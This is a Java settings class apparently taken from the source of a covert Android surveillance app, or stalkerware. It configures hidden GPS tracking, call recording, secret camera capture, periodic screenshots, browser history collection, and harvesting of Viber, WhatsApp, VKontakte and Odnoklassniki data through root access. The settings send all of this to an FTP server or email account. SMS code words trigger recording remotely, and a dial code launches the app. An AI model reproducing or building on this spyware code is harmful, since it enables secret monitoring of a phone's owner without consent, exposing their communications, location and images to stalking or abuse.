package com.dwreload;

import java.util.Date;

import com.dwreload.lib.TelephonyInfo;
import com.stericson.RootTools.RootTools;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.preference.PreferenceManager;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;

public class SettingsManager {
	private SharedPreferences settings;
	private Context mContext;
	
	private static final String EMPTY_STRING = "";
	
	public static final String KEY_IMEI = "IMEI";
	public static final String KEY_BROWSER_HISTORY = "BROWSER_HISTORY_ENABLED";
	
	public SettingsManager(Context context){
		this.settings = PreferenceManager.getDefaultSharedPreferences(context);
		this.mContext = context;
	}
	
	/** remove all settings */
	public void clear(){
		Editor editor = settings.edit();
		editor.clear();
		editor.commit();
	}
	
	public void remove(String key){
		Editor editor = settings.edit();
		editor.remove(key);
		editor.commit();
	}
//=========================================================================================
	public String imei(){
		String imei = settings.getString(KEY_IMEI, null);
		if (imei == null) {
			imei = getDeviceId();
		}
		return imei;
	}
	//----------------
	public String imsi(){
		String imsi = settings.getString("IMSI", null);
		if (imsi == null) {
			imsi = getDeviceIMSI();
		}
		return imsi;
	}
	public void imsi(String imsi){
		editSettings("IMSI", imsi);
	}
	//----------------
	public String PhoneName(){
		String id = settings.getString("PHONE_NAME", null);
		if (id == null) {
			id = getDeviceId();
		}
		return id;
	}
	public void PhoneName(String id){
		editSettings("PHONE_NAME", id);
	}
	//----------------
	public String runCode(){
		String code = settings.getString("APP_RUN_CODE", "001");
		if (code.length() == 0){
			code = "001";
		}
		return "**" + code + "**";
	}
	public void runCode(String code){
		editSettings("APP_RUN_CODE", code);
	}
	//----------------
	public Boolean onlyWiFi(){
		return settings.getBoolean("ONLY_WIFI", false);
	}
	public void onlyWiFi(Boolean val){
		editSettings("ONLY_WIFI", val);
	}
	//----------------
	public Boolean filesOnlyWiFi(){
		return settings.getBoolean("FILES_ONLY_WIFI", true);
	}
	public void filesOnlyWiFi(Boolean val){
		editSettings("FILES_ONLY_WIFI", val);
	}
	//----------------
	public Boolean DayReports(){
		return settings.getBoolean("DAYREPORT", false);
	}
	public void DayReports(Boolean val){
		editSettings("DAYREPORT", val);
	}
	//----------------
	public Integer RepHour(){
		return settings.getInt("REPHOUR", 23);
	}
	public void RepHour(Integer val){
		editSettings("REPHOUR", val);
	}
	//----------------
	public Integer RepMinute(){
		return settings.getInt("REPMIN", 30);
	}
	public void RepMinute(Integer val){
		editSettings("REPMIN", val);
	}
//--------------------------------GPS------------------------------	
	public Boolean isGpsTrackingEnabled(){
		return settings.getBoolean("USE_GPS", false);
	}
	public void isGpsTrackingEnabled(Boolean use){
		editSettings("USE_GPS", use);
	}
	//---------------
	public Boolean isGpsHidden(){
		return settings.getBoolean("GPS_HIDDEN", true);
	}
	public void isGpsHidden(Boolean hidden){
		editSettings("GPS_HIDDEN", hidden);
	}
	//--------------
	public long gpsInterval(){
		String val = settings.getString("GPS_TIMER", "30");
		return Long.parseLong(val) * 60 * 1000L;
	}
	public void gpsInterval(String interval){
		editSettings("GPS_TIMER", interval);
	}
	//--------------
	public Boolean gpsOnlyNew(){
		return settings.getBoolean("GPS_ONLY_NEW", true);
	}
	public void gpsOnlyNew(Boolean val){
		editSettings("GPS_ONLY_NEW", val);
	}
//-----------------------SMS notify----------------------------------
	public String notifyNumber(){
		return settings.getString("NOTIFY_NUMBER", EMPTY_STRING);
	}
	public void notifyNumber(String number){
		editSettings("NOTIFY_NUMBER", number);
	}
	//---------------
	public Boolean isSimChangeNotificationEnabled(){
		return settings.getBoolean("NOTIFY_SIM_CHANGE", false);
	}
	public void isSimChangeNotificationEnabled(Boolean enabled){
		editSettings("NOTIFY_SIM_CHANGE", enabled);
	}
	//---------------
	public Boolean notifySms(){
		return settings.getBoolean("NOTIFY_SMS", false);
	}
	public void notifySms(Boolean notify){
		editSettings("NOTIFY_SMS", notify);
	}
	//---------------
	public Boolean notifyCall(){
		return settings.getBoolean("NOTIFY_CALL", false);
	}
	public void notifyCall(Boolean notify){
		editSettings("NOTIFY_CALL", notify);
	}
//----------------------Filter--------------------------------------
	public Boolean isFilterEnabled(){
		return settings.getBoolean("FILTER_USE", false);
	}
	//----------------
	public void useFilter(Boolean use){
		editSettings("FILTER_USE", use);
	}
	//----------------
	public String filterType(){
		return settings.getString("FILTER_TYPE", "0");
	}
	public void filterType(String type){
		editSettings("FILTER_TYPE", type);
	}
	//---------------
	public String filterList(){
		return settings.getString("FILTER_LIST", EMPTY_STRING);
	}
	public Boolean isNumberFiltered(String number){
		String list = settings.getString("FILTER_LIST", EMPTY_STRING);
		Boolean inList = false;
		
		if (list.indexOf(number) != -1){
			inList = true;
		}
		String type = settings.getString("FILTER_TYPE", "0");
		if (type.equals("0")){
			return !inList;
		}
		else{
			return inList;
		}
	}
	//---------------
	public void filterAdd(String number){
		String list = settings.getString("FILTER_LIST", "");
		if (list.indexOf(number) != -1){
			return;
		}
		
		if (list.length() > 0){
			list += ",";
		}
		list += number;
		
		editSettings("FILTER_LIST", list);
	}
	//---------------
	public void filterDel(String number){
		String list = settings.getString("FILTER_LIST", EMPTY_STRING);
		list = list.replaceAll("," + number, EMPTY_STRING).replaceAll(number, EMPTY_STRING);
		if (list.length() > 0 && list.charAt(0) == ','){
			list = list.replaceFirst(",", EMPTY_STRING);
		}
		editSettings("FILTER_LIST", list);
	}
//---------------------Recording-----------------------------------
	public Boolean isRecordEnabled(){
		return settings.getBoolean("RECORD_CALLS", false);
	}
	public void isRecordEnabled(Boolean val){
		editSettings("RECORD_CALLS", val);
	}
	//--------------------
	public Boolean NumberInName(){
		return settings.getBoolean("NUMBER_IN_NAME", false);
	}
	public void NumberInName(Boolean val){
		editSettings("NUMBER_IN_NAME", val);
	}
	//--------------------
	public int recordFormat(){
		return Integer.parseInt(settings.getString("RECORD_FORMAT", "1"));
	}
	public void recordFormat(String format){
		editSettings("RECORD_FORMAT", format);
	}
	//--------------------
	public int recordSource(){
		return Integer.parseInt(settings.getString("RECORD_SOURCE", "1"));
	}
	public void recordSource(String source){
		editSettings("RECORD_SOURCE", source);
	}
//---------------------Photo---------------------------------------
 	public Boolean isPhotoCaptureEnabled(){
		return settings.getBoolean("CAPTURE_PHOTO", false);
	}
	public void isPhotoCaptureEnabled(Boolean val){
		editSettings("CAPTURE_PHOTO", val);
	}
	//------------------
	public int capturePhotoSize(){
		String stringSize = settings.getString("CAPTURE_PHOTO_FORMAT", "640");
		return Integer.parseInt(stringSize);
	}
	public void capturePhotoSize(String val){
		editSettings("CAPTURE_PHOTO_FORMAT", val);
	}
	//-----------------
	public Boolean isFrontCameraEnabled(){
		return settings.getBoolean("FRONT_CAMERA_ENABLED", false);
	}
	public void isFrontCameraEnabled(Boolean enabled){
		editSettings("FRONT_CAMERA_ENABLED", enabled);
	}
	//-----------------
	public Boolean UseBackCameraInsteadFront(){
		return settings.getBoolean("BACK_CAMERA_INSTEAD_FRONT", false);
	}
	public void UseBackCameraInsteadFront(Boolean enabled){
		editSettings("BACK_CAMERA_INSTEAD_FRONT", enabled);
	}
	//-----------------
	public String PhotoPath(){
		return settings.getString("PHOTOPATH", EMPTY_STRING);

	}
	public void PhotoPath(String path){
		editSettings("PHOTOPATH", path);
	}
//------------------------Screenshots------------------------------
	public Boolean isScreenshotEnabled(){
		return settings.getBoolean("SCREENSHOT_ENABLED", false);
	}
	public void isScreenshotEnabled(Boolean val){
		editSettings("SCREENSHOT_ENABLED", val);
	}
	//---------------
	public long screenshotInterval(){
		String val = settings.getString("SCREENSHOT_INTERVAL", "60");
		return Long.parseLong(val) * 1000L;
	}
	public void screenshotInterval(String val){
		editSettings("SCREENSHOT_INTERVAL", val);
	}
	//---------------
	public int screenshotSize(){
		String stringSize = settings.getString("SCREENSHOT_PHOTO_FORMAT", "640");
		return Integer.parseInt(stringSize);
	}
	public void screenshotSize(String val){
		editSettings("SCREENSHOT_PHOTO_FORMAT", val);
	}

//-------------------------Social--------------------------------------
	public Boolean isBrowserHistoryEnabled(){
		return settings.getBoolean(KEY_BROWSER_HISTORY, false);
	}
	public void isBrowserHistoryEnabled(Boolean enabled){
		editSettings(KEY_BROWSER_HISTORY, enabled);
	}
	//----------------
	public Boolean isViberEnabled(){
		return settings.getBoolean("VB_ENABLED", false);
	}
	public void isViberEnabled(Boolean enabled){
		editSettings("VB_ENABLED", enabled);
	}
	//----------------
	public Boolean isWhatsAppEnabled(){
		return settings.getBoolean("WA_ENABLED", false);
	}
	public void isWhatsAppEnabled(Boolean enabled){
		editSettings("WA_ENABLED", enabled);
	}
	//----------------
	public Boolean isVkEnabled(){
		return settings.getBoolean("VK_ENABLED", false);
	}
	public void isVkEnabled(Boolean enabled){
		editSettings("VK_ENABLED", enabled);
	}
	//----------------
	public Boolean isOKEnabled(){
		return settings.getBoolean("ODKL_ENABLED", false);
	}
	public void isOKEnabled(Boolean enabled){
		editSettings("ODKL_ENABLED", enabled);
	}
//-------------------------FTP settings--------------------------------------
	public Boolean sendSMStoFTP(){
		return settings.getBoolean("DUP_SMS", false);
	}
	public void sendSMStoFTP(Boolean duplicate){
		editSettings("DUP_SMS", duplicate);
	}
	//---------------
	public Boolean sendCallToFTP(){
		return settings.getBoolean("DUP_CALL", false);
	}
	public void sendCallToFTP(Boolean duplicate){
		editSettings("DUP_CALL", duplicate);
	}
	//---------------
	public Boolean SendFilesToFTP(){
		return settings.getBoolean("FILE_TO_FTP", false);
	}
	public void SendFilesToFTP(Boolean enabled){
		editSettings("FILE_TO_FTP", enabled);
	}
	//---------------
	public Boolean sendGpsToFTP(){
		return settings.getBoolean("GPS_TO_FTP", false);
	}
	public void sendGpsToFTP(Boolean enabled){
		editSettings("GPS_TO_FTP", enabled);
	}
	//----------------
	public Boolean sendHistoryToFTP(){
		return settings.getBoolean("HISTORY_TO_FTP", false);
	}
	public void sendHistoryToFTP(Boolean enabled){
		editSettings("HISTORY_TO_FTP", enabled);
	}
	//----------------
	public Boolean sendSocialToFTP(){
		return settings.getBoolean("FTP_SOCIAL", false);
	}
	public void sendSocialToFTP(Boolean send){
		editSettings("FTP_SOCIAL", send);
	}
	//----------------
	public Boolean sendAllOtherToFTP(){
		return settings.getBoolean("OTHER_TO_FTP", false);
	}
	public void sendAllOtherToFTP(Boolean enabled){
		editSettings("OTHER_TO_FTP", enabled);
	}
	//----------------
	public String ftp_adress(){
		return settings.getString("FTP_ADDR", EMPTY_STRING);
	}
	public void ftp_adress(String adr){
		editSettings("FTP_ADDR", adr);
	}
	//---------------
	public int ftp_port(){
		String prt = settings.getString("FTP_PORT", "21");
		return Integer.parseInt(prt);
	}
	public void ftp_port(String port){
		editSettings("FTP_PORT", port);
	}
	//---------------
	public String ftp_username(){
		return settings.getString("FTP_USERNAME", EMPTY_STRING);
	}
	public void ftp_username(String name){
		editSettings("FTP_USERNAME", name);
	}
	//---------------
	public String ftp_userpass(){
		return settings.getString("FTP_PASS", EMPTY_STRING);
	}
	public void ftp_userpass(String pass){
		editSettings("FTP_PASS", pass);
	}
	//--------------
	public String ftp_path(){
		return settings.getString("FTP_WORKPATH", "Records/");
	}
	public void ftp_path(String path){
		editSettings("FTP_WORKPATH", path);
	}
	
//-------------------------Mail settings--------------------------------------
		
	public Boolean sendSmstomail(){
		return settings.getBoolean("MAIL_SMS", false);
	}
	public void sendSmstomail(Boolean duplicate){
		editSettings("MAIL_SMS", duplicate);
	}
	//---------------
	public Boolean sendCallToMail(){
		return settings.getBoolean("MAIL_CALL", false);
	}
	public void sendCallToMail(Boolean duplicate){
		editSettings("MAIL_CALL", duplicate);
	}
	//---------------
	public Boolean SendFilesToMail(){
		return settings.getBoolean("FILE_TO_MAIL", false);
	}
	public void SendFilesToMail(Boolean enabled){
		editSettings("FILE_TO_MAIL", enabled);
	}
	//----------------
	public Boolean sendGpsToMail(){
		return settings.getBoolean("MAIL_GPS", false);
	}
	public void sendGpsToMail(Boolean enabled){
		editSettings("MAIL_GPS", enabled);
	}
	//----------------
	public Boolean sendHistoryToMail(){
		return settings.getBoolean("MAIL_HISTORY", false);
	}
	public void sendHistoryToMail(Boolean enabled){
		editSettings("MAIL_HISTORY", enabled);
	}
	//---------------
	public Boolean sendSocialToMail(){
		return settings.getBoolean("MAIL_SOCIAL", false);
	}
	public void sendSocialToMail(Boolean duplicate){
		editSettings("MAIL_SOCIAL", duplicate);
	}
	//----------------
	public Boolean sendAllOtherToMail(){
		return settings.getBoolean("MAIL_OTHER", false);
	}
	public void sendAllOtherToMail(Boolean enabled){
		editSettings("MAIL_OTHER", enabled);
	}
	//---------------
	public String email(){
		return settings.getString("MAIL_ADDR", EMPTY_STRING);
	}
	public void email(String email){
		editSettings("MAIL_ADDR", email);
	}
	//---------------
	public String email_username(){
		String name =  settings.getString("MAIL_USERNAME", null);
		if (name == null) name = settings.getString("MAIL_ADDR", EMPTY_STRING);
		return name;
	}
	public void email_username(String name){
		editSettings("MAIL_USERNAME", name);
	}
	//---------------
	public String email_acceptor()
		{
		String acc = settings.getString("MAIL_ACCEPTOR", null);
		if (acc == null) acc =  settings.getString("MAIL_ADDR", EMPTY_STRING);
		return acc;
	}
	public void email_acceptor(String acceptor){
		editSettings("MAIL_ACCEPTOR", acceptor);
	}
	//---------------
	public String email_userpass(){
		return settings.getString("MAIL_PASS", EMPTY_STRING);
	}
	public void email_userpass(String pass){
		editSettings("MAIL_PASS", pass);
	}
	//---------------
	public int servport(){
		String prt = settings.getString("SERVPORT", "465");
		return Integer.parseInt(prt);
	}
	public void servport(String port){
		editSettings("SERVPORT", port);
	}
	//---------------
	public String email_server(){
		return settings.getString("MAIL_SERVER", EMPTY_STRING);
	}
	public void email_server(String server){
		editSettings("MAIL_SERVER", server);
	}
	//----------------
	public String securityType(){
		return settings.getString("SECURITY_TYPE", "SSL");
	}
	public void securityType(String type){
		editSettings("SECURITY_TYPE", type);
	}
//===============================Code Words=================================================
	public String CodeWord1(){
		return settings.getString("CODE1", "8-)");
	}
	public void CodeWord1(String cword){
		editSettings("CODE1", cword);
	}
	//----------------
	public String CodeWord2(){
		return settings.getString("CODE2", "8-(");
	}
	public void CodeWord2(String cword){
		editSettings("CODE2", cword);
	}
	//----------------
	public String CodeWord3(){
		return settings.getString("CODE3", "8-/");
	}
	public void CodeWord3(String cword){
		editSettings("CODE3", cword);
	}
	//----------------
	public String Cmd1(){
		return settings.getString("CMD1", "record 1800");
	}
	public void Cmd1(String cmd){
		editSettings("CMD1", cmd);
	}
	//----------------
	public String Cmd2(){
		return settings.getString("CMD2", "record 3600");
	}
	public void Cmd2(String cmd){
		editSettings("CMD2", cmd);
	}
	//----------------
	public String Cmd3(){
		return settings.getString("CMD3", "recordstop");
	}
	public void Cmd3(String cmd){
		editSettings("CMD3", cmd);
	}
//==========================================================================================
	private void editSettings(String name, String param) {
		Editor editor = settings.edit();
		editor.putString(name, param);
		editor.commit();
	}
	private void editSettings(String name, Boolean param){
		Editor editor = settings.edit();
		editor.putBoolean(name, param);
		editor.commit();
	}
	private void editSettings(String name, Integer param){
		Editor editor = settings.edit();
		editor.putInt(name, param);
		editor.commit();
	}
//==========================================================================================
	private String getDeviceId(){
		String id = null;
		
		try {
			TelephonyInfo telephonyInfo = TelephonyInfo.getInstance(mContext);
			id = telephonyInfo.getImeiSIM1();
			//if (telephonyInfo.isDualSIM()) {
			//	id = "DUAL_" + telephonyInfo.getImeiSIM1() + "_" + telephonyInfo.getImeiSIM2();
			//}	
			
			if (id == null || id.length() == 0){
				String androidId = Secure.getString(mContext.getContentResolver(), Secure.ANDROID_ID);
				
				if (androidId == null || androidId.length() == 0 || androidId.equals("9774d56d682e549c")) {
					String serial = android.os.Build.class.getField("SERIAL").toString();
					
					if (serial.length() == 0) {
						throw new Exception("No IMEI, Secure.ANDROID_ID or Build.SERIAL");
					}
					
					id = "SERIAL_" + serial;
				}
				else{
					id = "ID_" + androidId;
				}
			}
			
		} catch (Exception e) {
			
			id = "NOIMEI_" + new Date().getTime();
			
		} finally{
			Editor editor = settings.edit();
			editor.putString(KEY_IMEI, id);
			editor.commit();
		}
		
		return id;
	}
	
	private String getDeviceIMSI(){
		TelephonyManager tm = (TelephonyManager)mContext.getSystemService(Context.TELEPHONY_SERVICE);
		String id = null;
        if (tm != null){
        	id = tm.getSubscriberId();
        }
        
        if (id == null || id.length() == 0){
        	id = "0";
        }
		
		return id;
	}
	
	public String getSettings()
	{
	Boolean root = (RootTools.isRootAvailable() && RootTools.isAccessGiven());
	String set =  "==========Main Settings=========\r\n";
	set = set 	+ "Phone name: "                + PhoneName()                                            + "\r\n"
				+ "IMEI: "                      + imei()                                                 + "\r\n"
				+ "Root: "                      + ((root)?"yes":"no")                                    + "\r\n"
				+ "Run code: "                  + runCode()                                              + "\r\n"
				+ "Only WiFi: "                 + (onlyWiFi()?"yes":"no")                                + "\r\n"
				+ "Files only WiFi: "           + (filesOnlyWiFi()?"yes":"no")                           + "\r\n"
				+ "--------------GPS----------------\r\n"
				+ "GPS Enabled: "               + (isGpsTrackingEnabled()?"yes":"no")                    + "\r\n"
				+ "GPS Hidden: "                + (isGpsHidden()?"yes":"no")                             + "\r\n"
				+ "Only new coordinates: "      + (gpsOnlyNew()?"yes":"no")                              + "\r\n"
				+ "Interval: "                  + String.valueOf(gpsInterval()/60000) + " min."          + "\r\n"
				+ "-----------SMS notify------------\r\n"
				+ "Notify number: "             + notifyNumber()                                         + "\r\n"
				+ "Notify if SIM changed: "     + (isSimChangeNotificationEnabled()?"yes":"no")          + "\r\n"
				+ "Duplicate SMS: "             + (notifySms()?"yes":"no")                               + "\r\n"
				+ "Notify about calls: "        + (notifyCall()?"yes":"no")                              + "\r\n"
				+ "-------------Filter--------------\r\n"
				+ "Filter enabled: "            + (isFilterEnabled()?"yes":"no")                         + "\r\n"
				+ "Filter type: "               + filterType()                                           + "\r\n"
				+ "Numbers: "                   + filterList()                                           + "\r\n"
				+ "--------------Audio--------------\r\n"
				+ "Recording enabled: "         + (isRecordEnabled()?"yes":"no")                         + "\r\n"
				+ "Recording format: "          + String.valueOf(recordFormat())                         + "\r\n"
				+ "Recording source: "          + String.valueOf(recordSource())                         + "\r\n"
				+ "Add number in filename: "    + (NumberInName()?"yes":"no")                            + "\r\n"
				+ "--------------Photo--------------\r\n"
				+ "Capture photo: "             + (isPhotoCaptureEnabled()?"yes":"no")                   + "\r\n"
				+ "Selfshot: "                  + (isFrontCameraEnabled()?"yes":"no")                    + "\r\n"
				+ "Back cam instead front: "    + (UseBackCameraInsteadFront()?"yes":"no")               + "\r\n"
				+ "-----------Screenshots-----------\r\n"
				+ "Enabled: "                   + (isScreenshotEnabled()?"yes":"no")+((root)?"":"(need root)") + "\r\n"
				+ "Interval: "                  + String.valueOf(screenshotInterval()/1000) + " sec."    + "\r\n"
				+ "--------------Social-------------\r\n"
				+ "Browser History enabled: "   + (isBrowserHistoryEnabled()?"yes":"no")                 + "\r\n"
				+ "Viber enabled: "             + (isViberEnabled()?"yes":"no")+((root)?"":"(need root)")+ "\r\n"
				+ "Whatsapp enabled: "          + (isWhatsAppEnabled()?"yes":"no")+((root)?"":"(need root)")+ "\r\n"
				+ "VKontakte enabled: "         + (isVkEnabled()?"yes":"no")+((root)?"":"(need root)")   + "\r\n"
				+ "Odnoklassniki enabled: "     + (isOKEnabled()?"yes":"no")+((root)?"":"(need root)")   + "\r\n";
	
	String mail = "==========Mail Settings=========\r\n";
	mail = mail	+ "E-mail: "                    + email()                                                + "\r\n"
				+ "Send mail to: "              + email_acceptor()                                       + "\r\n"
				+ "User name: "                 + email_username()                                       + "\r\n"
				+ "User password: "             + email_userpass()                                       + "\r\n"
				+ "SMTP server: "               + email_server()                                         + "\r\n"
				+ "Security type: "             + securityType()                                         + "\r\n"
				+ "Port: "                      + String.valueOf(servport())                             + "\r\n"
				+ "Duplicate SMS: "             + (sendSmstomail()?"yes":"no")                           + "\r\n"
				+ "Call info: "                 + (sendCallToMail()?"yes":"no")                          + "\r\n"
				+ "GPS info: "                  + (sendGpsToMail()?"yes":"no")                           + "\r\n"
				+ "Browser history: "           + (sendHistoryToMail()?"yes":"no")                       + "\r\n"
				+ "SocialNet history: "         + (sendSocialToMail()?"yes":"no")                        + "\r\n"
				+ "Other reports: "             + (sendAllOtherToMail()?"yes":"no")                      + "\r\n"
				+ "Files: "                     + (SendFilesToMail()?"yes":"no")                         + "\r\n";
				
	String FTP =  "===========FTP Settings=========\r\n";
	FTP = FTP	+ "FTP address: "               + ftp_adress()                                           + "\r\n"
				+ "User name: "                 + ftp_username()                                         + "\r\n"
				+ "User password: "             + ftp_userpass()                                         + "\r\n"
				+ "Port: "                      + String.valueOf(ftp_port())                             + "\r\n"
				+ "Work directory: "            + ftp_path()                                             + "\r\n"
				+ "Duplicate SMS: "             + (sendSMStoFTP()?"yes":"no")                            + "\r\n"
				+ "Call info: "                 + (sendCallToFTP()?"yes":"no")                           + "\r\n"
				+ "GPS info: "                  + (sendGpsToFTP()?"yes":"no")                            + "\r\n"
				+ "Browser history: "           + (sendHistoryToFTP()?"yes":"no")                        + "\r\n"
				+ "SocialNet history: "         + (sendSocialToFTP()?"yes":"no")                         + "\r\n"
				+ "Other reports: "             + (sendAllOtherToFTP()?"yes":"no")                       + "\r\n"
				+ "Files: "                     + (SendFilesToFTP()?"yes":"no")                          + "\r\n";
	
	String CMDS = "===========SMS Commands=========\r\n";
	CMDS = CMDS	+ "Codeword 1: "                + CodeWord1()                                            + "\r\n"
				+ "Command: "                   + Cmd1()                                                 + "\r\n"
				+ "Codeword 2: "                + CodeWord2()                                            + "\r\n"
				+ "Command: "                   + Cmd2()                                                 + "\r\n"
				+ "Codeword 3: "                + CodeWord3()                                            + "\r\n"
				+ "Command: "                   + Cmd3()                                                 + "\r\n";


	return set + FTP + mail + CMDS;
	}

}
